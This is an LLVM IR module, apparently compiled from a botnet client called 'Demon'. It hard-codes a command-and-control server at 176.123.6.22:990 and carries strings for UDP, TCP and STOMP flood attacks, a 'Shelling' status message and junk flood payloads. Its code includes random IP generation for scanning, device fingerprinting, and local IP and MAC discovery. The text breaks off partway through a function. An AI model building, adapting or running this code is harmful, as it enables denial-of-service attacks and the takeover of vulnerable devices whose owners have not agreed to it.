; ModuleID = 'host/ir_O1/Demon.a.ll'
source_filename = "llvm-link"
target datalayout = "e-m:e-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.in_addr = type { i32 }
%struct.sockaddr_in = type { i16, i16, %struct.in_addr, [8 x i8] }
%struct.ifreq = type { %union.anon, %union.anon.0 }
%union.anon = type { [16 x i8] }
%union.anon.0 = type { %struct.ifmap }
%struct.ifmap = type { i64, i64, i16, i8, i8, i8 }
%struct.sockaddr = type { i16, [14 x i8] }
%struct.__va_list_tag = type { i32, i32, i8*, i8* }
%struct.fd_set = type { [16 x i64] }
%struct.timeval = type { i64, i64 }
%struct.iphdr = type { i8, i8, i16, i16, i16, i8, i8, i16, i32, i32 }
%struct.tcphdr = type { %union.anon.1 }
%union.anon.1 = type { %struct.anon }
%struct.anon = type { i16, i16, i32, i32, i8, i8, i16, i16, i16 }
%struct.hostent = type { i8*, i8**, i32, i32, i8** }

@commServer = local_unnamed_addr global [1 x i8*] [i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str, i32 0, i32 0)], align 8
@.str = private unnamed_addr constant [17 x i8] c"176.123.6.22:990\00", align 1
@mainCommSock = local_unnamed_addr global i32 0, align 4
@currentServer = local_unnamed_addr global i32 -1, align 4
@gotIP = local_unnamed_addr global i32 0, align 4
@numpids = local_unnamed_addr global i64 0, align 8
@macAddress = local_unnamed_addr global [6 x i8] zeroinitializer, align 1
@ourIP = common local_unnamed_addr global %struct.in_addr zeroinitializer, align 4
@pids = common local_unnamed_addr global i32* null, align 8
@Q = internal unnamed_addr global [4096 x i32] zeroinitializer, align 16
@rand_cmwc.i = internal unnamed_addr global i32 4095, align 4
@c = internal unnamed_addr global i32 362436, align 4
@.str.1 = private unnamed_addr constant [8 x i8] c"8.8.8.8\00", align 1
@.str.2 = private unnamed_addr constant [16 x i8] c"/proc/net/route\00", align 1
@.str.3 = private unnamed_addr constant [11 x i8] c"\0900000000\09\00", align 1
@.str.41 = private unnamed_addr constant [7 x i8] c"(null)\00", align 1
@.str.4 = private unnamed_addr constant [4 x i8] c"all\00", align 1
@.str.5 = private unnamed_addr constant [2 x i8] c",\00", align 1
@.str.6 = private unnamed_addr constant [4 x i8] c"syn\00", align 1
@.str.7 = private unnamed_addr constant [4 x i8] c"rst\00", align 1
@.str.8 = private unnamed_addr constant [4 x i8] c"fin\00", align 1
@.str.9 = private unnamed_addr constant [4 x i8] c"ack\00", align 1
@.str.10 = private unnamed_addr constant [4 x i8] c"psh\00", align 1
@.str.11 = private unnamed_addr constant [159 x i8] c"4E/x31/x6B/x4B/x31/x20/x21/x73/x69/x20/x4D/x33/x75/x79/x20/x4C/x30/x56/x72/x33/x20/x3C/x33/x20/x50/x61/x32/x72/x43/x48/x20/x4D/x32/x20/x41/x34/x34/x72/x43/x4B\00", align 1
@.str.12 = private unnamed_addr constant [356 x i8] c"lXfYi\18fYC7TFaCq5Hv982wuIiKbHlgFA0jEsW2OFQStO7x6zN9dBgayyWgvbk0L3lZClzJCmFG3GVNDFc2iTHNYy7gss8dHboBdeKE1VcblH1AxrVyiqokw2RYFvd4cd1QxyaHawwP6go9feBeHdlvMRDLbEbty3Py8yVT3UTjy3ZKONXmMNvURTUZTkeH37XT9H5JwH0vKB1Yw2rSYkTwcTvx6OltSIlahFg92uCRbLM8amh8GaGGGRw56iNUTGLgi395vj9ZVVeP01k7Tvq3NRvxo########!!!!!!!!!!!!!!!@!@!@$!%@&$^!@%%^!@%*!(@%&*(!@%&!@*(%&!@()%*!@%))\00", align 1
@.str.13 = private unnamed_addr constant [193 x i8] c"/x6f/x58/x22/x2e/x04/x92/x04/xa4/x42/x94/xb4/xf4/x44/xf4/x94/xd2/x04/xb4/xc4/xd2/x05/x84/xb4/xa4/xa6/xb3/x24/xd4/xb4/xf4/xa5/x74/xf4/x42/x04/x94/xf2/x24/xf5/x02/x03/xc4/x45/x04/xf5/x14/x44/x23\00", align 1
@.str.14 = private unnamed_addr constant [60 x i8] c"xmiwdio MOQWI\22K (**(D8u9289d2892e9 NIOWJDiojwioWAJM DKLAM) \00", align 1
@.str.15 = private unnamed_addr constant [193 x i8] c"/x48/x39/x32/x29/x53/x54/x49/x6c/x65/x20/x29/x5f/x51/x20/x49/x53/x4e/x22/x20/x4b/x58/x4d/x3c/x20/x4f/x53/x51/x22/x4f/x50/x20/x50/x41/x43/x4b/x45/x54/x20/xc2/xa3/x52/x4f/x4d/x57/x44/x4b/x4c/x57\00", align 1
@.str.16 = private unnamed_addr constant [7 x i8] c"x86_64\00", align 1
@.str.17 = private unnamed_addr constant [16 x i8] c"/usr/bin/python\00", align 1
@.str.18 = private unnamed_addr constant [14 x i8] c"Python Device\00", align 1
@.str.19 = private unnamed_addr constant [14 x i8] c"/usr/bin/perl\00", align 1
@.str.20 = private unnamed_addr constant [12 x i8] c"Perl Device\00", align 1
@.str.21 = private unnamed_addr constant [18 x i8] c"/usr/sbin/telnetd\00", align 1
@.str.22 = private unnamed_addr constant [14 x i8] c"Telnet Device\00", align 1
@.str.23 = private unnamed_addr constant [8 x i8] c"Unknown\00", align 1
@.str.24 = private unnamed_addr constant [3 x i8] c"22\00", align 1
@.str.25 = private unnamed_addr constant [3 x i8] c"23\00", align 1
@.str.26 = private unnamed_addr constant [18 x i8] c"/etc/apt/apt.conf\00", align 1
@.str.27 = private unnamed_addr constant [20 x i8] c"Debian Based Device\00", align 1
@.str.28 = private unnamed_addr constant [14 x i8] c"/etc/yum.conf\00", align 1
@.str.29 = private unnamed_addr constant [18 x i8] c"REHL Based Device\00", align 1
@.str.30 = private unnamed_addr constant [11 x i8] c"Unknown OS\00", align 1
@.str.31 = private unnamed_addr constant [4 x i8] c"UDP\00", align 1
@.str.32 = private unnamed_addr constant [4 x i8] c"STD\00", align 1
@.str.33 = private unnamed_addr constant [4 x i8] c"TCP\00", align 1
@.str.34 = private unnamed_addr constant [45 x i8] c"Sending TCP Packets To: %s:%d for %d seconds\00", align 1
@.str.35 = private unnamed_addr constant [6 x i8] c"STOMP\00", align 1
@.str.36 = private unnamed_addr constant [4 x i8] c"CNC\00", align 1
@.str.37 = private unnamed_addr constant [5 x i8] c"STOP\00", align 1
@.str.38 = private unnamed_addr constant [2 x i8] c"/\00", align 1
@.str.39 = private unnamed_addr constant [46 x i8] c"[Shelling]-->[%s]-->[%s]-->[%s]-->[%s]-->[%s]\00", align 1
@.str.40 = private unnamed_addr constant [2 x i8] c" \00", align 1

; Function Attrs: noinline norecurse nounwind uwtable
define void @init_rand(i32) local_unnamed_addr #0 {
  store i32 %0, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 0), align 16
  %2 = add i32 %0, -1640531527
  store i32 %2, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 1), align 4
  %3 = add i32 %0, 1013904242
  store i32 %3, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 2), align 8
  br label %4

; <label>:4:                                      ; preds = %17, %1
  %indvars.iv = phi i64 [ 3, %1 ], [ %indvars.iv.next.1, %17 ]
  %5 = add nsw i64 %indvars.iv, -3
  %6 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %5
  %7 = load i32, i32* %6, align 4
  %8 = add nsw i64 %indvars.iv, -2
  %9 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %8
  %10 = load i32, i32* %9, align 4
  %11 = trunc i64 %indvars.iv to i32
  %12 = xor i32 %11, -1640531527
  %13 = xor i32 %12, %7
  %14 = xor i32 %13, %10
  %15 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %indvars.iv
  store i32 %14, i32* %15, align 4
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %exitcond = icmp eq i64 %indvars.iv.next, 4096
  br i1 %exitcond, label %16, label %17

; <label>:16:                                     ; preds = %4
  ret void

; <label>:17:                                     ; preds = %4
  %18 = add nsw i64 %indvars.iv, -2
  %19 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %18
  %20 = load i32, i32* %19, align 4
  %21 = add nsw i64 %indvars.iv, -1
  %22 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %21
  %23 = load i32, i32* %22, align 4
  %24 = trunc i64 %indvars.iv.next to i32
  %25 = xor i32 %24, -1640531527
  %26 = xor i32 %25, %20
  %27 = xor i32 %26, %23
  %28 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %indvars.iv.next
  store i32 %27, i32* %28, align 4
  %indvars.iv.next.1 = add nsw i64 %indvars.iv, 2
  br label %4
}

; Function Attrs: noinline norecurse nounwind uwtable
define i32 @rand_cmwc() local_unnamed_addr #0 {
  %1 = load i32, i32* @rand_cmwc.i, align 4
  %2 = add i32 %1, 1
  %3 = and i32 %2, 4095
  store i32 %3, i32* @rand_cmwc.i, align 4
  %4 = zext i32 %3 to i64
  %5 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %4
  %6 = load i32, i32* %5, align 4
  %7 = zext i32 %6 to i64
  %8 = mul nuw nsw i64 %7, 18782
  %9 = load i32, i32* @c, align 4
  %10 = zext i32 %9 to i64
  %11 = add nuw nsw i64 %8, %10
  %12 = lshr i64 %11, 32
  %13 = trunc i64 %12 to i32
  %14 = add nuw nsw i64 %12, %11
  %15 = trunc i64 %14 to i32
  %16 = icmp ult i32 %15, %13
  %17 = zext i1 %16 to i32
  %storemerge = add nuw nsw i32 %17, %13
  store i32 %storemerge, i32* @c, align 4
  %.neg7 = sext i1 %16 to i32
  %.0.neg = sub i32 -2, %15
  %18 = add i32 %.0.neg, %.neg7
  %19 = load i32, i32* @rand_cmwc.i, align 4
  %20 = zext i32 %19 to i64
  %21 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %20
  store i32 %18, i32* %21, align 4
  ret i32 %18
}

; Function Attrs: noinline nounwind uwtable
define i32 @getRandomIP(i32) local_unnamed_addr #1 {
  %2 = load i32, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i64 0, i32 0), align 4
  %3 = tail call i32 @ntohl(i32 %2) #13
  %4 = and i32 %3, %0
  %5 = tail call i32 @rand_cmwc()
  %6 = xor i32 %0, -1
  %7 = and i32 %5, %6
  %8 = xor i32 %7, %4
  ret i32 %8
}

; Function Attrs: nounwind readnone
declare i32 @ntohl(i32) local_unnamed_addr #2

; Function Attrs: noinline nounwind uwtable
define i8* @fdgets(i8*, i32, i32) local_unnamed_addr #1 {
  %4 = icmp sgt i32 %1, 0
  br i1 %4, label %.lr.ph.preheader, label %.critedge

.lr.ph.preheader:                                 ; preds = %3
  %5 = sext i32 %1 to i64
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %10
  %indvars.iv = phi i64 [ 0, %.lr.ph.preheader ], [ %indvars.iv.next, %10 ]
  %6 = getelementptr inbounds i8, i8* %0, i64 %indvars.iv
  %7 = getelementptr inbounds i8, i8* %6, i64 -1
  %8 = load i8, i8* %7, align 1
  %9 = icmp eq i8 %8, 10
  br i1 %9, label %.critedge.loopexit, label %10

; <label>:10:                                     ; preds = %.lr.ph
  %11 = tail call i64 @read(i32 %2, i8* %6, i64 1) #7
  %12 = trunc i64 %11 to i32
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %13 = icmp eq i32 %12, 1
  %14 = icmp slt i64 %indvars.iv.next, %5
  %or.cond = and i1 %13, %14
  br i1 %or.cond, label %.lr.ph, label %.critedge.loopexit

.critedge.loopexit:                               ; preds = %.lr.ph, %10
  %.011.lcssa.ph = phi i32 [ 1, %.lr.ph ], [ %12, %10 ]
  br label %.critedge

.critedge:                                        ; preds = %.critedge.loopexit, %3
  %.011.lcssa = phi i32 [ 1, %3 ], [ %.011.lcssa.ph, %.critedge.loopexit ]
  %15 = icmp eq i32 %.011.lcssa, 0
  %16 = select i1 %15, i8* null, i8* %0
  ret i8* %16
}

declare i64 @read(i32, i8* nocapture, i64) local_unnamed_addr #3

; Function Attrs: noinline nounwind uwtable
define i32 @getOurIP() local_unnamed_addr #1 {
  %1 = alloca %struct.sockaddr_in, align 4
  %2 = alloca %struct.sockaddr_in, align 4
  %3 = alloca i32, align 4
  %4 = alloca [4096 x i8], align 16
  %5 = alloca %struct.ifreq, align 8
  %6 = tail call i32 @socket(i32 2, i32 2, i32 0) #7
  %7 = icmp eq i32 %6, -1
  br i1 %7, label %46, label %8

; <label>:8:                                      ; preds = %0
  %9 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %1, i64 0, i32 3, i64 0
  %10 = bitcast i8* %9 to i64*
  store i64 0, i64* %10, align 4
  %11 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %1, i64 0, i32 0
  store i16 2, i16* %11, align 4
  %12 = tail call i32 @inet_addr(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.1, i64 0, i64 0)) #7
  %13 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %1, i64 0, i32 2, i32 0
  store i32 %12, i32* %13, align 4
  %14 = tail call zeroext i16 @htons(i16 zeroext 53) #13
  %15 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %1, i64 0, i32 1
  store i16 %14, i16* %15, align 2
  %16 = bitcast %struct.sockaddr_in* %1 to %struct.sockaddr*
  %17 = call i32 @connect(i32 %6, %struct.sockaddr* nonnull %16, i32 16) #7
  %18 = icmp eq i32 %17, -1
  br i1 %18, label %46, label %19

; <label>:19:                                     ; preds = %8
  store i32 16, i32* %3, align 4
  %20 = bitcast %struct.sockaddr_in* %2 to %struct.sockaddr*
  %21 = call i32 @getsockname(i32 %6, %struct.sockaddr* nonnull %20, i32* nonnull %3) #7
  %22 = icmp eq i32 %21, -1
  br i1 %22, label %46, label %23

; <label>:23:                                     ; preds = %19
  %24 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %2, i64 0, i32 2, i32 0
  %25 = load i32, i32* %24, align 4
  store i32 %25, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i64 0, i32 0), align 4
  %26 = call i32 (i8*, i32, ...) @open(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.2, i64 0, i64 0), i32 0) #7
  %27 = getelementptr inbounds [4096 x i8], [4096 x i8]* %4, i64 0, i64 0
  %28 = call i8* @fdgets(i8* nonnull %27, i32 4096, i32 %26)
  %29 = icmp eq i8* %28, null
  br i1 %29, label %.loopexit17, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %23
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %36
  %30 = call i8* @strstr(i8* nonnull %27, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.3, i64 0, i64 0)) #14
  %31 = icmp eq i8* %30, null
  br i1 %31, label %36, label %.preheader.preheader

.preheader.preheader:                             ; preds = %.lr.ph
  br label %.preheader

.preheader:                                       ; preds = %.preheader.preheader, %.preheader
  %.015 = phi i8* [ %34, %.preheader ], [ %27, %.preheader.preheader ]
  %32 = load i8, i8* %.015, align 1
  %33 = icmp eq i8 %32, 9
  %34 = getelementptr inbounds i8, i8* %.015, i64 1
  br i1 %33, label %35, label %.preheader

; <label>:35:                                     ; preds = %.preheader
  store i8 0, i8* %.015, align 1
  br label %.loopexit17

; <label>:36:                                     ; preds = %.lr.ph
  call void @llvm.memset.p0i8.i64(i8* nonnull %27, i8 0, i64 4096, i32 16, i1 false)
  %37 = call i8* @fdgets(i8* nonnull %27, i32 4096, i32 %26)
  %38 = icmp eq i8* %37, null
  br i1 %38, label %.loopexit17.loopexit, label %.lr.ph

.loopexit17.loopexit:                             ; preds = %36
  br label %.loopexit17

.loopexit17:                                      ; preds = %.loopexit17.loopexit, %23, %35
  %39 = call i32 @close(i32 %26) #7
  %40 = load i8, i8* %27, align 16
  %41 = icmp eq i8 %40, 0
  br i1 %41, label %.loopexit, label %.loopexit.loopexit

.loopexit.loopexit:                               ; preds = %.loopexit17
  %42 = getelementptr inbounds %struct.ifreq, %struct.ifreq* %5, i64 0, i32 0, i32 0, i64 0
  %43 = call i8* @strcpy(i8* nonnull %42, i8* nonnull %27) #7
  %44 = call i32 (i32, i64, ...) @ioctl(i32 %6, i64 35111, %struct.ifreq* nonnull %5) #7
  %scevgep = getelementptr inbounds %struct.ifreq, %struct.ifreq* %5, i64 0, i32 1, i32 0, i32 0
  %scevgep20 = bitcast i64* %scevgep to i8*
  %uglygep = getelementptr inbounds i8, i8* %scevgep20, i64 2
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @macAddress, i64 0, i64 0), i8* %uglygep, i64 6, i32 1, i1 false)
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit.loopexit, %.loopexit17
  %45 = call i32 @close(i32 %6) #7
  br label %46

; <label>:46:                                     ; preds = %19, %8, %0, %.loopexit
  ret i32 0
}

; Function Attrs: nounwind
declare i32 @socket(i32, i32, i32) local_unnamed_addr #4

; Function Attrs: argmemonly nounwind
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i32, i1) #5

; Function Attrs: nounwind
declare i32 @inet_addr(i8*) local_unnamed_addr #4

; Function Attrs: nounwind readnone
declare zeroext i16 @htons(i16 zeroext) local_unnamed_addr #2

declare i32 @connect(i32, %struct.sockaddr*, i32) local_unnamed_addr #3

; Function Attrs: nounwind
declare i32 @getsockname(i32, %struct.sockaddr*, i32*) local_unnamed_addr #4

declare i32 @open(i8* nocapture readonly, i32, ...) local_unnamed_addr #3

; Function Attrs: nounwind readonly
declare i8* @strstr(i8*, i8* nocapture) local_unnamed_addr #6

declare i32 @close(i32) local_unnamed_addr #3

; Function Attrs: nounwind
declare i8* @strcpy(i8*, i8* nocapture readonly) local_unnamed_addr #4

; Function Attrs: nounwind
declare i32 @ioctl(i32, i64, ...) local_unnamed_addr #4

; Function Attrs: noinline nounwind uwtable
define void @trim(i8* nocapture) local_unnamed_addr #1 {
  %2 = tail call i64 @strlen(i8* %0) #14
  %3 = add i64 %2, 4294967295
  br label %4

; <label>:4:                                      ; preds = %4, %1
  %indvars.iv29 = phi i64 [ %indvars.iv.next30, %4 ], [ 0, %1 ]
  %5 = getelementptr inbounds i8, i8* %0, i64 %indvars.iv29
  %6 = load i8, i8* %5, align 1
  %7 = sext i8 %6 to i32
  %8 = tail call i32 @isspace(i32 %7) #14
  %9 = icmp eq i32 %8, 0
  %indvars.iv.next30 = add nuw i64 %indvars.iv29, 1
  br i1 %9, label %.preheader, label %4

.preheader:                                       ; preds = %4
  %10 = trunc i64 %3 to i32
  %11 = trunc i64 %indvars.iv29 to i32
  %12 = icmp slt i32 %10, %11
  br i1 %12, label %.critedge.preheader, label %.lr.ph22.preheader

.lr.ph22.preheader:                               ; preds = %.preheader
  %sext = shl i64 %3, 32
  %13 = ashr exact i64 %sext, 32
  %sext31 = shl i64 %indvars.iv29, 32
  %14 = ashr exact i64 %sext31, 32
  br label %.lr.ph22

.critedge.preheader.loopexit:                     ; preds = %.lr.ph22, %25
  %.0.lcssa.ph = phi i32 [ %24, %.lr.ph22 ], [ %26, %25 ]
  br label %.critedge.preheader

.critedge.preheader:                              ; preds = %.critedge.preheader.loopexit, %.preheader
  %.0.lcssa = phi i32 [ %10, %.preheader ], [ %.0.lcssa.ph, %.critedge.preheader.loopexit ]
  %15 = icmp sgt i32 %11, %.0.lcssa
  br i1 %15, label %.critedge._crit_edge, label %.critedge.preheader26

.critedge.preheader26:                            ; preds = %.critedge.preheader
  %sext32 = shl i64 %indvars.iv29, 32
  %16 = ashr exact i64 %sext32, 32
  %sext33 = shl i64 %indvars.iv29, 32
  %17 = ashr exact i64 %sext33, 32
  %18 = sext i32 %.0.lcssa to i64
  br label %.critedge

.lr.ph22:                                         ; preds = %.lr.ph22.preheader, %25
  %indvars.iv27 = phi i64 [ %13, %.lr.ph22.preheader ], [ %indvars.iv.next28, %25 ]
  %.021 = phi i32 [ %10, %.lr.ph22.preheader ], [ %26, %25 ]
  %19 = getelementptr inbounds i8, i8* %0, i64 %indvars.iv27
  %20 = load i8, i8* %19, align 1
  %21 = sext i8 %20 to i32
  %22 = tail call i32 @isspace(i32 %21) #14
  %23 = icmp eq i32 %22, 0
  %24 = trunc i64 %indvars.iv27 to i32
  br i1 %23, label %.critedge.preheader.loopexit, label %25

; <label>:25:                                     ; preds = %.lr.ph22
  %indvars.iv.next28 = add nsw i64 %indvars.iv27, -1
  %26 = add nsw i32 %.021, -1
  %27 = icmp sgt i64 %indvars.iv27, %14
  br i1 %27, label %.lr.ph22, label %.critedge.preheader.loopexit

.critedge:                                        ; preds = %.critedge.preheader26, %.critedge
  %indvars.iv = phi i64 [ %16, %.critedge.preheader26 ], [ %indvars.iv.next, %.critedge ]
  %28 = getelementptr inbounds i8, i8* %0, i64 %indvars.iv
  %29 = load i8, i8* %28, align 1
  %30 = sub nsw i64 %indvars.iv, %17
  %31 = getelementptr inbounds i8, i8* %0, i64 %30
  store i8 %29, i8* %31, align 1
  %indvars.iv.next = add nsw i64 %indvars.iv, 1
  %32 = icmp slt i64 %indvars.iv, %18
  br i1 %32, label %.critedge, label %.critedge._crit_edge.loopexit

.critedge._crit_edge.loopexit:                    ; preds = %.critedge
  br label %.critedge._crit_edge

.critedge._crit_edge:                             ; preds = %.critedge._crit_edge.loopexit, %.critedge.preheader
  %.019.lcssa = phi i64 [ %indvars.iv29, %.critedge.preheader ], [ %indvars.iv.next, %.critedge._crit_edge.loopexit ]
  %33 = sub i64 %.019.lcssa, %indvars.iv29
  %sext34 = shl i64 %33, 32
  %34 = ashr exact i64 %sext34, 32
  %35 = getelementptr inbounds i8, i8* %0, i64 %34
  store i8 0, i8* %35, align 1
  ret void
}

; Function Attrs: nounwind readonly
declare i64 @strlen(i8* nocapture) local_unnamed_addr #6

; Function Attrs: nounwind readonly
declare i32 @isspace(i32) local_unnamed_addr #6

; Function Attrs: noinline nounwind uwtable
define i32 @sockprintf(i32, i8* nocapture readonly, ...) local_unnamed_addr #1 {
  %3 = alloca i8*, align 8
  %4 = alloca [1 x %struct.__va_list_tag], align 16
  %5 = tail call noalias i8* @malloc(i64 2048) #7
  store i8* %5, i8** %3, align 8
  tail call void @llvm.memset.p0i8.i64(i8* %5, i8 0, i64 2048, i32 1, i1 false)
  %6 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %4, i64 0, i64 0
  %7 = bitcast [1 x %struct.__va_list_tag]* %4 to i8*
  call void @llvm.va_start(i8* nonnull %7)
  call fastcc void @print(i8** nonnull %3, i8* %1, %struct.__va_list_tag* nonnull %6)
  call void @llvm.va_end(i8* nonnull %7)
  %8 = call i64 @strlen(i8* %5) #14
  %9 = getelementptr inbounds i8, i8* %5, i64 %8
  store i8 10, i8* %9, align 1
  %10 = call i64 @strlen(i8* %5) #14
  %11 = call i64 @send(i32 %0, i8* %5, i64 %10, i32 16384) #7
  %12 = trunc i64 %11 to i32
  call void @free(i8* %5) #7
  ret i32 %12
}

; Function Attrs: nounwind
declare noalias i8* @malloc(i64) local_unnamed_addr #4

; Function Attrs: nounwind
declare void @llvm.va_start(i8*) #7

; Function Attrs: noinline nounwind uwtable
define internal fastcc void @print(i8**, i8* nocapture readonly, %struct.__va_list_tag*) unnamed_addr #1 {
  %4 = alloca [2 x i8], align 1
  %5 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %2, i64 0, i32 0
  %6 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %2, i64 0, i32 3
  %7 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %2, i64 0, i32 2
  %8 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %2, i64 0, i32 0
  %9 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %2, i64 0, i32 3
  %10 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %2, i64 0, i32 2
  %11 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %2, i64 0, i32 0
  %12 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %2, i64 0, i32 3
  %13 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %2, i64 0, i32 2
  %14 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %2, i64 0, i32 0
  %15 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %2, i64 0, i32 3
  %16 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %2, i64 0, i32 2
  %17 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %2, i64 0, i32 0
  %18 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %2, i64 0, i32 3
  %19 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %2, i64 0, i32 2
  %20 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %2, i64 0, i32 0
  %21 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %2, i64 0, i32 3
  %22 = getelementptr inbounds [2 x i8], [2 x i8]* %4, i64 0, i64 0
  %23 = getelementptr inbounds [2 x i8], [2 x i8]* %4, i64 0, i64 1
  %24 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %2, i64 0, i32 2
  br label %25

; <label>:25:                                     ; preds = %146, %3
  %.0 = phi i8* [ %1, %3 ], [ %147, %146 ]
  %26 = load i8, i8* %.0, align 1
  switch i8 %26, label %143 [
    i8 0, label %148
    i8 37, label %27
  ]

; <label>:27:                                     ; preds = %25
  %28 = getelementptr inbounds i8, i8* %.0, i64 1
  %29 = load i8, i8* %28, align 1
  switch i8 %29, label %.preheader6 [
    i8 0, label %148
    i8 37, label %143
    i8 45, label %30
  ]

; <label>:30:                                     ; preds = %27
  %31 = getelementptr inbounds i8, i8* %.0, i64 2
  br label %.preheader6

.preheader6:                                      ; preds = %30, %27
  %.063.ph = phi i32 [ 0, %27 ], [ 1, %30 ]
  %.1.ph = phi i8* [ %28, %27 ], [ %31, %30 ]
  %32 = load i8, i8* %.1.ph, align 1
  %33 = icmp eq i8 %32, 48
  br i1 %33, label %.lr.ph.preheader, label %.preheader

.lr.ph.preheader:                                 ; preds = %.preheader6
  br label %.lr.ph

.preheader.loopexit:                              ; preds = %.lr.ph
  br label %.preheader

.preheader:                                       ; preds = %.preheader.loopexit, %.preheader6
  %.063.lcssa = phi i32 [ %.063.ph, %.preheader6 ], [ %37, %.preheader.loopexit ]
  %.1.lcssa = phi i8* [ %.1.ph, %.preheader6 ], [ %36, %.preheader.loopexit ]
  %34 = load i8, i8* %.1.lcssa, align 1
  %.off10 = add i8 %34, -48
  %35 = icmp ult i8 %.off10, 10
  br i1 %35, label %.lr.ph13.preheader, label %.critedge

.lr.ph13.preheader:                               ; preds = %.preheader
  br label %.lr.ph13

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.lr.ph
  %.18 = phi i8* [ %36, %.lr.ph ], [ %.1.ph, %.lr.ph.preheader ]
  %.0637 = phi i32 [ %37, %.lr.ph ], [ %.063.ph, %.lr.ph.preheader ]
  %36 = getelementptr inbounds i8, i8* %.18, i64 1
  %37 = or i32 %.0637, 2
  %38 = load i8, i8* %36, align 1
  %39 = icmp eq i8 %38, 48
  br i1 %39, label %.lr.ph, label %.preheader.loopexit

.lr.ph13:                                         ; preds = %.lr.ph13.preheader, %.lr.ph13
  %40 = phi i8 [ %46, %.lr.ph13 ], [ %34, %.lr.ph13.preheader ]
  %.212 = phi i8* [ %45, %.lr.ph13 ], [ %.1.lcssa, %.lr.ph13.preheader ]
  %.06411 = phi i32 [ %44, %.lr.ph13 ], [ 0, %.lr.ph13.preheader ]
  %41 = zext i8 %40 to i32
  %42 = mul nsw i32 %.06411, 10
  %43 = add i32 %42, -48
  %44 = add i32 %43, %41
  %45 = getelementptr inbounds i8, i8* %.212, i64 1
  %46 = load i8, i8* %45, align 1
  %.off = add i8 %46, -48
  %47 = icmp ult i8 %.off, 10
  br i1 %47, label %.lr.ph13, label %.critedge.loopexit

.critedge.loopexit:                               ; preds = %.lr.ph13
  br label %.critedge

.critedge:                                        ; preds = %.critedge.loopexit, %.preheader
  %.064.lcssa = phi i32 [ 0, %.preheader ], [ %44, %.critedge.loopexit ]
  %.2.lcssa = phi i8* [ %.1.lcssa, %.preheader ], [ %45, %.critedge.loopexit ]
  %.lcssa = phi i8 [ %34, %.preheader ], [ %46, %.critedge.loopexit ]
  switch i8 %.lcssa, label %146 [
    i8 115, label %48
    i8 100, label %67
    i8 120, label %82
    i8 88, label %97
    i8 117, label %112
    i8 99, label %127
  ]

; <label>:48:                                     ; preds = %.critedge
  %49 = load i32, i32* %5, align 8
  %50 = icmp ult i32 %49, 41
  br i1 %50, label %51, label %56

; <label>:51:                                     ; preds = %48
  %52 = load i8*, i8** %6, align 8
  %53 = sext i32 %49 to i64
  %54 = getelementptr i8, i8* %52, i64 %53
  %55 = add i32 %49, 8
  store i32 %55, i32* %5, align 8
  br label %59

; <label>:56:                                     ; preds = %48
  %57 = load i8*, i8** %7, align 8
  %58 = getelementptr i8, i8* %57, i64 8
  store i8* %58, i8** %7, align 8
  br label %59

; <label>:59:                                     ; preds = %56, %51
  %.in5 = phi i8* [ %54, %51 ], [ %57, %56 ]
  %60 = bitcast i8* %.in5 to i32*
  %61 = load i32, i32* %60, align 4
  %62 = sext i32 %61 to i64
  %63 = inttoptr i64 %62 to i8*
  %64 = icmp ne i32 %61, 0
